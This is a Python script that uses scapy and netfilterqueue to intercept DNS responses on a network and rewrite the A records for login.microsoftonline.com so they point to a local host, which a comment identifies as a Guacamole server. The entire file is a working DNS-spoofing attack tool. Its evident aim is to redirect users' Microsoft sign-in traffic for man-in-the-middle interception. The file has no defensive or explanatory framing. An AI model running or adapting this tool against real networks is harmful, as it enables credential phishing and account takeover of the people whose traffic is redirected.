from scapy.all import *
import netfilterqueue

TARGET_DOMAIN = 'login.microsoftonline.com'
SEND_TO = '192.168.0.153'  # Redirect to Guacamole server

def override_packet(packet):
    """
    Modify only the A records (IP addresses) in the DNS response to point to the spoofed IP.
    """
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):  # Ensure the DNS response layer exists
        answers = scapy_packet[DNS].an
        modified_answers = []  # Collect modified answers

        if not isinstance(answers, list):  # Single answer case
            answers = [answers]

        for answer in answers:
            if answer.type == 1:  # A record
                rrname = answer.rrname.decode()
                if TARGET_DOMAIN in rrname:  # Match the target domain
                    original_ip = answer.rdata
                    print(f"[SPOOFING] Replacing A record {rrname} -> {original_ip} with {SEND_TO}")
                    # Replace the IP address in the A record
                    modified_answers.append(DNSRR(rrname=rrname, rdata=SEND_TO, ttl=answer.ttl))
                else:
                    modified_answers.append(answer)  # Keep other domains unchanged
            else:
                modified_answers.append(answer)  # Keep non-A records unchanged

        # Update the DNS response with modified answers
        scapy_packet[DNS].an = modified_answers
        scapy_packet[DNS].ancount = len(modified_answers)

        # Recalculate checksums and lengths
        del scapy_packet[IP].len
        del scapy_packet[IP].chksum
        del scapy_packet[UDP].len
        del scapy_packet[UDP].chksum

        # Set the modified packet as the payload
        packet.set_payload(bytes(scapy_packet))
    else:
        print("[WARNING] DNS response does not have DNSRR layer. Ignoring packet.")

    return packet

def process_packet(packet):
    """
    Process DNS packets to redirect login.microsoftonline.com to the spoofed IP.
    """
    scapy_packet = IP(packet.get_payload())

    if scapy_packet.haslayer(DNS):  # Check for DNS layer
        if scapy_packet[DNS].qr == 1:  # DNS Response
            if scapy_packet.haslayer(DNSRR) and TARGET_DOMAIN in scapy_packet[DNSRR].rrname.decode():
                packet = override_packet(packet)  # Modify the packet to spoof the response
        else:
            print(f"[DNS REQUEST] {scapy_packet[DNS].qd.qname.decode()}")

    packet.accept()  # Forward the packet

def main():
    """
    Main function to process packets in the NetfilterQueue.
    """
    print("[*] Starting packet redirection...")
    queue = netfilterqueue.NetfilterQueue()

    try:
        # Bind to queue 0 and process packets
        queue.bind(0, process_packet)
        queue.run()
    except KeyboardInterrupt:
        print("\n[!] Stopping script.")
    finally:
        queue.unbind()

if __name__ == "__main__":
    main()
